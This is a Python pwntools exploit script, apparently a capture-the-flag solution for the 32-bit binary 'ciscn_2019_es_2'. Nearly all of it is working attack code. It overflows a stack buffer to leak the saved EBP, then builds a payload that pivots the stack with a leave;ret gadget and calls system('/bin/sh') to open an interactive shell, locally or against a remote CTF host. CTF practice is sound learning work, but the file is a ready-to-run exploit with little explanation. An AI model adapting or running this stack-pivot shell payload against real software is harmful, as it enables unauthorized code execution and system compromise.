from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'ciscn_2019_es_2'
port = 27117

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'
log.success('='*100)
##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
首先进行栈迁移
'''
fake_ebp_addr = 0x08049FD4
leave_ret_addr = 0x080484b8
pop3_addr = 0x08048699

read_plt = io_elf.plt['read']
system_plt = io_elf.plt['system']
hack_addr = io_elf.sym['hack']
main_addr = io_elf.sym['main']
vul_addr = io_elf.sym['vul']



io.recvuntil("Welcome, my friend. What's your name?\n")
payload = b'a' * 0x28
io.send(payload)
io.recvuntil(b'a' * 0x28)
ebp_info = io.recv(4)
ebp_info = u32(ebp_info.ljust(4, b'\x00'))
buf_addr = ebp_info - 0x38
cur_ebp_addr = ebp_info- 0x10

LOG_ADDR_SUCCESS('ebp_info', ebp_info)
LOG_ADDR_SUCCESS('buf_addr', buf_addr)
LOG_ADDR_SUCCESS('cur_ebp_addr', cur_ebp_addr)
payload = p32(ebp_info) + p32(system_plt) + p32(main_addr) + p32(buf_addr+0x10)+b'/bin/sh\x00' + (40 - 24) * b'\x00' +  p32(buf_addr) + p32(leave_ret_addr)
# payload = p32(ebp_info)  + p32(system_plt) + p32(main_addr) + p32(buf_addr + 20) + 4 *b'a' + b'/bin/sh\x00\x00\x00\x00\x00' + p32(buf_addr) + p32(leave_ret_addr) #这个目前不行
io.send(payload)
io.interactive()
